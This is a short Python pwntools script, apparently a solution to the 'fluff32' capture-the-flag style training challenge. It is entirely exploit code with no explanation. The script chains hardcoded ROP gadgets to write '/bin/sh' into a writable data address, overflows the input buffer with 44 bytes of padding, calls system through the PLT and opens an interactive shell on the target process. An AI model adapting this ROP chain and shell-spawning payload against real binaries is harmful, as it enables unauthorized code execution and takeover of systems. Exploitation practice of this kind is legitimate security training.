from pwn import *

system_plt   = 0x08048430
data_addr = 0x0804a028

pop_ebx      = 0x080483e1
mov_ecx_edx  = 0x08048693
xchg_edx_ecx = 0x08048689
xor_edx_ebx  = 0x0804867b
xor_edx_edx  = 0x08048671

def write_data(data, addr):
    # addr -> ecx
    payload = ""
    payload += p32(xor_edx_edx)
    payload += "BBBB"
    payload += p32(pop_ebx)
    payload += p32(addr)
    payload += p32(xor_edx_ebx)
    payload += "BBBB"
    payload += p32(xchg_edx_ecx)
    payload += "BBBB"
    
    # data -> edx
    payload += p32(xor_edx_edx)
    payload += "BBBB"
    payload += p32(pop_ebx)
    payload += data
    payload += p32(xor_edx_ebx)
    payload += "BBBB"
    
    # edx -> [ecx]
    payload += p32(mov_ecx_edx)
    payload += "BBBB"
    payload += p32(0)

    return payload

payload = ""
payload += "A"*44

payload += write_data("/bin", data_addr)
payload += write_data("/sh\x00", data_addr + 4)

payload += p32(system_plt)
payload += "BBBB"
payload += p32(data_addr)

io = process('./fluff32')
io.recvuntil('>')
io.sendline(payload)
io.interactive()

